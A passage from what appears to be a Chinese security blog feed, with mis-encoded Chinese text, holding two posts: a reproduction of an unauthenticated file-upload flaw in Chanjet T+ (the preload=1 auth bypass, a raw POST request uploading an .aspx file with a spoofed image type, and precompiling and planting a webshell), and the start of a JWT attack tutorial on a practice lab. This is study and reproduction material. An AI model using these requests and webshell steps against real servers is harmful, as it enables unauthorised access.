language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;,</span><br><span class="line">this.PhotoTooLarge,</span><br><span class="line">&quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;,</span><br><span class="line">text,</span><br><span class="line">&quot;&#x27;;&lt;/script&gt;&quot;</span><br><span class="line">&#125;));</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">if (this.File1.PostedFile.ContentType != &quot;image/jpeg&quot; &amp;&amp; this.File1.PostedFile.ContentType != &quot;image/bmp&quot; &amp;&amp; this.File1.PostedFile.ContentType != &quot;image/gif&quot; &amp;&amp; this.File1.PostedFile.ContentType != &quot;image/pjpeg&quot;)</span><br><span class="line">&#123;</span><br><span class="line">base.Response.Write(string.Concat(new string[]</span><br><span class="line">&#123;</span><br><span class="line">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;,</span><br><span class="line">this.PhotoTypeError,</span><br><span class="line">&quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;,</span><br><span class="line">text,</span><br><span class="line">&quot;&#x27;;&lt;/script&gt;&quot;</span><br><span class="line">&#125;));</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">string fileName = this.File1.PostedFile.FileName;</span><br><span class="line">string text2 = fileName.Substring(fileName.LastIndexOf(&#x27;\\&#x27;) + 1);</span><br><span class="line">this.File1.PostedFile.SaveAs(base.Server.MapPath(&quot;.&quot;) + &quot;\\images\\&quot; + text2);</span><br><span class="line">string value = base.Server.MapPath(&quot;.&quot;) + &quot;\\images\\&quot; + text2;</span><br><span class="line">this.ViewState[&quot;fileName&quot;] = &quot;images/&quot; + text2;</span><br><span class="line">TPContext.Current.Session[&quot;ImageName&quot;] = value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æ ¹æ®è·å–åˆ°çš„æºç è¿›è¡Œåˆ†æ</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024041444451.png" data-caption="image-20221024041444451"><img src="/../images/chanjet/image-20221024041444451.png" alt="image-20221024041444451"></a></p><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>åŸç†äº†è§£ï¼Œå®è·µå¼€å§‹ï¼Œé€šè¿‡ Burp æŠ“åŒ…ï¼Œæ„é€ è¯­å¥ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨ Windows è‡ªå¸¦æµè§ˆå™¨è¿›è¡Œæµé‡ä»£ç†ï¼Œå› ä¸ºä½¿ç”¨ Chrome æ— æ³•è¿›è¡ŒæŠ“åŒ…</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024042906233.png" data-caption="image-20221024042906233"><img src="/../images/chanjet/image-20221024042906233.png" alt="image-20221024042906233"></a></p><p>è®¿é—® <code>/tplus/SM/SetupAccount/Upload.aspx</code> è·¯å¾„è¿›è¡ŒæŠ“åŒ…ï¼Œè¿™é‡Œç›´æ¥æ›¿æ¢ä¸ºå‚è€ƒæ–‡ç« å¸ˆå‚…çš„æ•°æ®åŒ…å³å¯ï¼Œä¿®æ”¹ IP ä¸ºæœ¬åœ° IP</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /tplus/SM/SetupAccount/Upload.aspx HTTP/1.1</span><br><span class="line">Host: 192.168.114.144</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: ASP.NET_SessionId=gvigofzulthd2v1i2q5zndtf; Hm_lvt_fd4ca40261bc424e2d120b806d985a14=1662302093; Hm_lpvt_fd4ca40261bc424e2d120b806d985a14=1662302093</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywwk2ReqGTj7lNYlt</span><br><span class="line">Content-Length: 182</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarywwk2ReqGTj7lNYlt</span><br><span class="line">Content-Disposition: form-data; name=&quot;File1&quot;;filename=&quot;test.aspx&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundarywwk2ReqGTj7lNYlt--</span><br></pre></td></tr></table></figure></div><p>ç³»ç»Ÿæç¤ºéœ€è¦ç™»å½•</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024043859326.png" data-caption="image-20221024043859326"><img src="/../images/chanjet/image-20221024043859326.png" alt="image-20221024043859326"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024043922964.png" data-caption="image-20221024043922964"><img src="/../images/chanjet/image-20221024043922964.png" alt="image-20221024043922964"></a></p><p>å…¶å®æ ¹æ®æŠ«éœ²çš„å…¥å£ç‚¹ä¸º <code>tplus/SM/SetupAccount/Upload.aspx?preload=1</code>ï¼Œæˆ‘ä»¬ç›´æ¥æ›¿æ¢ä¸ºè¿™ä¸ªè·¯å¾„å³å¯ï¼Œä½†å‚è€ƒæ–‡ç« ä¸­çš„å¸ˆå‚…ç»™å‡ºäº†åˆ†æï¼Œæˆ‘ä»¬å°±ç»§ç»­è·Ÿè¿›å­¦ä¹ ä¸€ä¸‹å…¶åŸç†ã€‚æ ¹æ®æç¤ºä¸Šä¼ æ–‡ä»¶éœ€è¦ç™»å½•ï¼Œé‚£å°±éœ€è¦å¯»æ‰¾ç³»ç»Ÿé‰´æƒçš„ä»£ç è¿›è¡Œåˆ†æï¼Œåˆ†æå…¶é‰´æƒæ–¹å¼ï¼Œä»¥åŠæ˜¯å¦å­˜åœ¨ç»•è¿‡çš„å¯èƒ½ã€‚</p><p>æ ¹æ®åˆ†æ <code>App_Web_upload.aspx.9475d17f</code> çš„ä»£ç ï¼Œåœ¨æ­¤å¤„å¹¶æ²¡æœ‰å‘ç°é‰´æƒçš„åœ°æ–¹</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024054329571.png" data-caption="image-20221024054329571"><img src="/../images/chanjet/image-20221024054329571.png" alt="image-20221024054329571"></a></p><p>å‘ä¸Šå›æº¯ï¼Œå‘ç°å…¶å¼•ç”¨äº† <code>APP.global.asax</code> ï¼Œå¯¹åº”çš„ç¨‹åºé›†åå­—ä¸º <code>APP_Web_global.asax.cs.cdcab7d2</code></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024060249466.png" data-caption="image-20221024060249466"><img src="/../images/chanjet/image-20221024060249466.png" alt="image-20221024060249466"></a></p><p>ç›´æ¥åŒå‡»è¿›å…¥å…¶ç¨‹åºé›†ï¼Œè·å–å…¶ dll æ–‡ä»¶æºç ï¼Œç¿»çœ‹ä»£ç å‘ç° <code>Application_PreRequestHandlerExecute</code> å‡½æ•°ä¸­å®šä¹‰è‹¥ <code>preload</code> å‚æ•° &#x3D;&#x3D; 1 åˆ™ä¸è¿›è¡Œ session è®¤è¯</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024061347375.png" data-caption="image-20221024061347375"><img src="/../images/chanjet/image-20221024061347375.png" alt="image-20221024061347375"></a></p><p>æ•´åˆä¿¡æ¯ï¼Œæ¼æ´è·¯å¾„ä¸º <code>tplus/SM/SetupAccount/Upload.aspx?preload=1</code>ï¼Œä¿®æ”¹ POST è¯·æ±‚è·¯å¾„ï¼Œå†æ¬¡å°è¯•è¿›è¡Œæ–‡ä»¶ä¸Šä¼ </p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024062024119.png" data-caption="image-20221024062024119"><img src="/../images/chanjet/image-20221024062024119.png" alt="image-20221024062024119"></a> </p><p>æ–‡ä»¶æˆåŠŸä¸Šä¼ è‡³ <code>\WebSite\SM\SetupAccount\images</code> ç›®å½•ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024062222705.png" data-caption="image-20221024062222705"><img src="/../images/chanjet/image-20221024062222705.png" alt="image-20221024062222705"></a></p><p>ä¸Šä¼  webshell æ–‡ä»¶</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024063740516.png" data-caption="image-20221024063740516"><img src="/../images/chanjet/image-20221024063740516.png" alt="image-20221024063740516"></a></p><p>è™½ç„¶æ–‡ä»¶æˆåŠŸä¸Šä¼ äº†ï¼Œä½†å½“æˆ‘ä»¬è¿›è¡Œè®¿é—®çš„æ—¶å€™ï¼Œå‘ç°é¡µé¢æŠ¥é”™äº†ï¼ŒåŸå› æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰è¿›è¡Œé¢„ç¼–è¯‘ï¼Œæ‰€ä»¥ç³»ç»Ÿæ— æ³•è¯†åˆ«</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024072123338.png" data-caption="image-20221024072123338"><img src="/../images/chanjet/image-20221024072123338.png" alt="image-20221024072123338"></a></p><p>ç»•è¿‡ç³»ç»Ÿé™åˆ¶ï¼Œå…¨å±€æœç´¢ï¼Œåˆ©ç”¨ç³»ç»Ÿ <code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727</code> ä¸­çš„ <code>aspnet_compiler.exe</code>, ç”Ÿæˆç¨‹åºé›†ï¼Œç»•è¿‡é¢„ç¼–è¯‘æœºåˆ¶</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024070455365.png" data-caption="image-20221024070455365"><img src="/../images/chanjet/image-20221024070455365.png" alt="image-20221024070455365"></a></p><p>Cmd æ‰§è¡Œï¼Œ<code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;aspnet_compiler -v \ -p C:\Users\Boom\Desktop\TPlus\shell C:\Users\Boom\Desktop\TPlus\upfile -fixednames</code> ï¼Œ-p ä»£è¡¨çš„æ˜¯ä½ æœ¨é©¬çš„ç›®å½•ã€‚ C:\Users\Boom\Desktop\TPlus\upfile è¡¨ç¤ºç”Ÿæˆçš„ .dll æ–‡ä»¶åœ¨å“ªä¸ªç›®å½•ä¸­</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024073401113.png" data-caption="image-20221024073401113"><img src="/../images/chanjet/image-20221024073401113.png" alt="image-20221024073401113"></a></p><p>ç”Ÿæˆæ–‡ä»¶å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024073739122.png" data-caption="image-20221024073739122"><img src="/../images/chanjet/image-20221024073739122.png" alt="image-20221024073739122"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024073802424.png" data-caption="image-20221024073802424"><img src="/../images/chanjet/image-20221024073802424.png" alt="image-20221024073802424"></a></p><p>è¿™é‡Œæ›´æ¢ä¸ºå†°èé©¬åˆ©ç”¨æˆåŠŸï¼Œå°† &#x2F;bin æ–‡ä»¶å¤¹ç›®å½•ä¸‹é¢çš„ .dll æ–‡ä»¶åŠé¢„ç¼–è¯‘åçš„ shell æ–‡ä»¶ä¸Šä¼ åˆ°ç½‘ç«™ &#x2F;bin ç›®å½• <code>C:\Program Files (x86)\Chanjet\TPlusStd\WebSite\bin</code></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024075122109.png" data-caption="image-20221024075122109"><img src="/../images/chanjet/image-20221024075122109.png" alt="image-20221024075122109"></a></p><p>è¿™é‡Œå¾—é…åˆç›®å½•ç©¿è¶Šä¸Šä¼ é¢„ç¼–è¯‘æ–‡ä»¶æ‰èƒ½æˆåŠŸ Getshellï¼Œè¿™è¾¹æ²¡èƒ½æˆåŠŸå¤ç°ã€‚è¿™è¾¹æ˜¯ç›´æ¥æŠŠæ–‡ä»¶æ‹‰åˆ°ç½‘ç«™ç›®å½•ä¸‹çš„ï¼Œå®æˆ˜ä¸­å¯èƒ½å­˜åœ¨ asp ä¸Šä¼ æˆåŠŸè§£æï¼Œä¸éœ€è¦ä¸Šä¼ é¢„ç¼–è¯‘æ–‡ä»¶çš„å¯èƒ½ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024081450142.png" data-caption="image-20221024081450142"><img src="/../images/chanjet/image-20221024081450142.png" alt="image-20221024081450142"></a></p><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>é€šè¿‡è¿™æ¬¡çš„æ¼æ´å¤ç°ï¼Œè¿˜æ˜¯èƒ½å­¦ä¹ åˆ°å¾ˆå¤šçš„çŸ¥è¯†ç‚¹ï¼Œä»ç¯å¢ƒçš„æ­å»ºã€æºç çš„åˆ†æã€dllåç¼–è¯‘å†åˆ°æ¼æ´åŸç†åˆ†æï¼Œä¸€æ­¥æ¥ä¸€æ­¥æ‰“å¼€æ€è·¯ï¼ŒåŠ æ·±æ¼æ´åŸç†çš„å­¦ä¹ ï¼Œä»ä¸€ä¸ªçŸ¥è¯†ç‚¹æ‰©å±•åˆ°å…¶å®ƒåˆ†æ”¯çŸ¥è¯†ï¼Œæ€»ä½“ä¸Šæ”¶è·è‰¯å¥½ã€‚</p><h2 id="äº”ã€å‚è€ƒæ–‡ç« "><a href="#äº”ã€å‚è€ƒæ–‡ç« " class="headerlink" title="äº”ã€å‚è€ƒæ–‡ç« "></a>äº”ã€å‚è€ƒæ–‡ç« </h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.o2oxy.cn/4104.html</span><br><span class="line">https://cloud.tencent.com/developer/article/1381405</span><br><span class="line">https://www.debugease.com/aspdotnet/74941.html</span><br><span class="line">https://www.buaq.net/go-53733.html</span><br><span class="line">https://blog.csdn.net/xiayu729100940/article/details/126646035</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> WEBæ¼æ´ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´å¤ç° </tag>
            
            <tag> ç•…æ·é€š </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEBæ¼æ´ç³»åˆ—-JWTæ”»å‡»æ‰‹æ®µè€ƒç©¶</title>
      <link href="/2022/10/22/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-JWT%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E8%80%83%E7%A9%B6/"/>
      <url>/2022/10/22/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-JWT%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E8%80%83%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€JWTç®€è¿°"><a href="#ä¸€ã€JWTç®€è¿°" class="headerlink" title="ä¸€ã€JWTç®€è¿°"></a>ä¸€ã€JWTç®€è¿°</h2><p>JWT(Json Web Token)æ˜¯ä¸€ç§æ ‡å‡†åŒ–æ ¼å¼ï¼Œç”¨äºåœ¨ç³»ç»Ÿä¹‹é—´å‘é€ç»è¿‡åŠ å¯†ç­¾åçš„ JSON æ•°æ®ï¼Œå¸¸ç”¨äºç³»ç»Ÿèº«ä»½è®¤è¯ã€ä¼šè¯ç®¡ç†å’Œè®¿é—®æ§åˆ¶æœºåˆ¶ã€‚å…¶æ ¼å¼ä¸»è¦ç”±å¤´ä¿¡æ¯ï¼ˆheaderï¼‰ã€æ¶ˆæ¯ä½“ï¼ˆpayloadï¼‰ã€ç­¾åï¼ˆsignatureï¼‰3éƒ¨åˆ†ç»„æˆã€‚</p><h2 id="äºŒã€JWTæ ¼å¼"><a href="#äºŒã€JWTæ ¼å¼" class="headerlink" title="äºŒã€JWTæ ¼å¼"></a>äºŒã€JWTæ ¼å¼</h2><h3 id="1ã€æ ¼å¼è§„åˆ™"><a href="#1ã€æ ¼å¼è§„åˆ™" class="headerlink" title="1ã€æ ¼å¼è§„åˆ™"></a>1ã€æ ¼å¼è§„åˆ™</h3><p>å¦‚ä¸‹ä¸º JWT ä¾‹å­ï¼Œåˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€æ­¥éƒ¨åˆ†ä¸ºå¤´ä¿¡æ¯ï¼ˆheaderï¼‰ã€ç¬¬äºŒéƒ¨åˆ†ä¸ºæ¶ˆæ¯ä½“ï¼ˆpayloadï¼‰ã€ç¬¬ä¸‰éƒ¨åˆ†ä¸ºç­¾åï¼ˆsignatureï¼‰ï¼Œæ•°æ®ç»è¿‡åŠ å¯†å¤„ç†åé€šè¿‡ç¬¦å· <code>.</code> è¿›è¡Œæ‹¼æ¥åå¾—åˆ°å®Œæ•´çš„JWT Token å€¼</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure></div><br/><p>åˆ©ç”¨ jwt.io ç½‘ç«™è¿›è¡Œåœ¨çº¿è§£å¯†è·å–å…¶ä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022005803698.png" data-caption="image-20221022005803698"><img src="/../images/jwt/image-20221022005803698.png" alt="image-20221022005803698"></a></p><h3 id="2ã€åŠ å¯†è§„åˆ™"><a href="#2ã€åŠ å¯†è§„åˆ™" class="headerlink" title="2ã€åŠ å¯†è§„åˆ™"></a>2ã€åŠ å¯†è§„åˆ™</h3><p>ç¬¬ä¸€éƒ¨åˆ†ï¼šå¤´ä¿¡æ¯ï¼ˆheaderï¼‰ï¼Œè¯¥éƒ¨åˆ†å®šä¹‰äº†å›ºå®šçš„ç®—æ³•ä¸º â€œHS256â€ï¼Œtokenç±»å‹ä¸º â€œJWTâ€,è¯¥éƒ¨åˆ† Json æ•°æ®éœ€ç»è¿‡ base64url åŠ å¯†åå¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†æ•°æ®ï¼Œä»¥ä¸‹ä¸ºåŸå§‹æ•°æ®åŠåŠ å¯†å¤„ç†åæ•°æ®</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><br/><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022014816164.png" data-caption="image-20221022014816164"><img src="/../images/jwt/image-20221022014816164.png" alt="image-20221022014816164"></a></p><p>ç¬¬äºŒéƒ¨åˆ†ï¼šæ¶ˆæ¯ä½“-payloadï¼Œè¯¥éƒ¨åˆ†ä¸»è¦ä¸ºä¸€äº›åŠŸèƒ½ç‚¹çš„æ•°æ®å€¼ï¼Œè¿™ä¸€éƒ¨åˆ†çš„ JSON æ•°æ®ä¹Ÿéœ€è¦è¿›è¡Œ base64url åŠ å¯†å¤„ç†ï¼Œä»¥ä¸‹ä¸ºåŸå§‹æ•°æ®åŠåŠ å¯†å¤„ç†åæ•°æ®</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span><span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span><span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><br/><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022015337482.png" data-caption="image-20221022015337482"><img src="/../images/jwt/image-20221022015337482.png" alt="image-20221022015337482"></a></p><p>ç¬¬ä¸‰éƒ¨åˆ†ï¼šç­¾åï¼ˆsignatureï¼‰ï¼Œå°†å‰é¢ç¬¬ä¸€ã€ç¬¬äºŒéƒ¨åˆ†ç»è¿‡åŠ å¯†å¤„ç†åçš„æ•°æ®åˆ©ç”¨ç¬¦å· <code>.</code> æ‹¼æ¥èµ·æ¥ï¼Œç„¶åå†åˆ©ç”¨ â€œHS256â€ åŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†å¾—åˆ°ç¬¬ä¸‰éƒ¨åˆ†åŠ å¯†æ•°æ®ï¼Œä¸‰éƒ¨åˆ†é€šè¿‡ç¬¦å· <code>.</code> æ‹¼æ¥åå¾—åˆ°å®Œæ•´çš„ JWT Token å€¼ï¼Œä»¥ä¸‹ä¸ºåŸå§‹æ•°æ®åŠåŠ å¯†å¤„ç†åæ•°æ®</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">base64url(</span><br><span class="line"> HMACSHA256(</span><br><span class="line"> base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> + base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line"> your<span class="number">-256</span>-bit-secret (ç§˜é’¥åŠ ç›)</span><br><span class="line"> )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div><br/><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure></div><br/><h2 id="ä¸‰ã€JWT-å±å®³åŠæ”»å‡»ç‚¹"><a href="#ä¸‰ã€JWT-å±å®³åŠæ”»å‡»ç‚¹" class="headerlink" title="ä¸‰ã€JWT å±å®³åŠæ”»å‡»ç‚¹"></a>ä¸‰ã€JWT å±å®³åŠæ”»å‡»ç‚¹</h2><p>JWT é€šå¸¸ä»¥ä¼ªé€ ä»»æ„å€¼åˆ›å»ºè‡ªå·±çš„æœ‰æ•ˆä»¤ç‰Œï¼Œæå‡è‡ªå·±çš„æƒé™æˆ–å†’å……å…¶ä»–ç”¨æˆ·ï¼Œä»è€Œå®Œå…¨æ¥ç®¡è¿™äº›ç”¨æˆ·çš„è´¦æˆ·ï¼Œä¸»è¦æ”»å‡»ç‚¹æœ‰ä»¥ä¸‹å‡ éƒ¨åˆ†ï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç©ºç®—æ³•éªŒè¯</span><br><span class="line">ä¸éªŒè¯ç­¾åå†…å®¹åˆ†</span><br><span class="line">å¯†é’¥æ³„éœ²&amp;æš´åŠ›ç ´è§£å¯†é’¥</span><br><span class="line">å¯†ç æ··æ·†æ”»å‡»</span><br><span class="line">ç¯¡æ”¹ JWT Headerï¼Œkid æŒ‡å®šæ”»å‡»</span><br></pre></td></tr></table></figure></div><br/><h2 id="å››ã€é¶åœºå­¦ä¹ "><a href="#å››ã€é¶åœºå­¦ä¹ " class="headerlink" title="å››ã€é¶åœºå­¦ä¹ "></a>å››ã€é¶åœºå­¦ä¹ </h2><p>åœ¨çº¿é¶åœº</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://jwt-lab.herokuapp.com/challenges</span><br></pre></td></tr></table></figure></div><br/><h3 id="1ã€ç©ºç®—æ³•éªŒè¯"><a href="#1ã€ç©ºç®—æ³•éªŒè¯" class="headerlink" title="1ã€ç©ºç®—æ³•éªŒè¯"></a>1ã€ç©ºç®—æ³•éªŒè¯</h3><p>JWT å€¼ Header ä¸­çš„ â€œalgâ€ å‚æ•°ç”¨äºå£°æ˜åŠ å¯†ç®—æ³•ï¼Œå¦‚æœåº”ç”¨ç¨‹åºæ²¡æœ‰æœ‰æ•ˆéªŒè¯ â€œalgâ€ çš„å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†å…¶å€¼æ›´æ”¹ä¸º â€œnoneâ€ï¼Œç»•è¿‡ç­¾åéªŒè¯</p><p>è¿›å…¥ jwt-lab é¶åœºï¼Œåˆ›å»ºä¸€ä¸ªè´¦å·</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022024849697.png" data-caption="image-20221022024849697"><img src="/../images/jwt/image-20221022024849697.png" alt="image-20221022024849697"></a><br><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022024927517.png" data-caption="image-20221022024927517"><img src="/../images/jwt/image-20221022024927517.png" alt="image-20221022024927517"></a></p><p>ç‚¹å‡»è¿›å…¥ â€œNone Algorithmâ€ é¶åœºï¼Œåˆ©ç”¨åˆšæ‰æ³¨å†Œçš„è´¦å·è¿›è¡Œç™»å½•ï¼ŒBurp æŠ“åŒ…</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022025314222.png" data-caption="image-20221022025314222"><img src="/../images/jwt/image-20221022025314222.png" alt="image-20221022025314222"></a></p><p>çœ‹åˆ° Cookie å¤„çš„ chanllenge ä¸­çš„å€¼ä½¿ç”¨çš„æ˜¯ JWT æ ¼å¼</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022025516380.png" data-caption="image-20221022025516380"><img src="/../images/jwt/image-20221022025516380.png" alt="image-20221022025516380"></a></p><p>å°†å‰é¢ä¸¤éƒ¨åˆ†è¿›è¡Œè§£å¯†å¾—åŠ å¯†ç®—æ³•ä¸º â€œRS256â€ã€ç”¨æˆ·åä¸º â€œwoohooâ€</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022025952064.png" data-caption="image-20221022025952064"><img src="/../images/jwt/image-20221022025952064.png" alt="image-20221022025952064"></a></p><p>å°†åŠ å¯†ç®—æ³•æ”¹ä¸º â€œnoneâ€ ç„¶åå°† JWT Header å¤´éƒ¨åˆ†è¿›è¡Œ base64url ç¼–ç ï¼Œæœ€åæ›¿æ¢åŸå§‹çš„ JWT Header å¤´çš„ç¬¬ä¸€éƒ¨åˆ†åˆ©ç”¨ Burp é‡æ”¾ï¼Œè‹¥ä¾ç„¶è¿”å›æ­£ç¡®é¡µé¢åˆ™å­˜åœ¨æ¼æ´ï¼Œæˆ‘ä»¬æŠŠ Result ä¸­ <code>eyJhbGciOiJub25lIn0=</code> , â€œ&#x3D;â€ å»æ‰ï¼Œè¿™é‡Œç¼–ç åä¸åº”è¯¥å‡ºç°ï¼Œæš‚æ—¶å…ˆä¸ç®¡ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022031534531.png" data-caption="image-20221022031534531"><img src="/../images/jwt/image-20221022031534531.png" alt="image-20221022031534531"></a></p><p><a data-fancybox="gallery" data-src="/../images/jwt/image-20221022031706787.png" data-caption="image-20221022031706787"><img 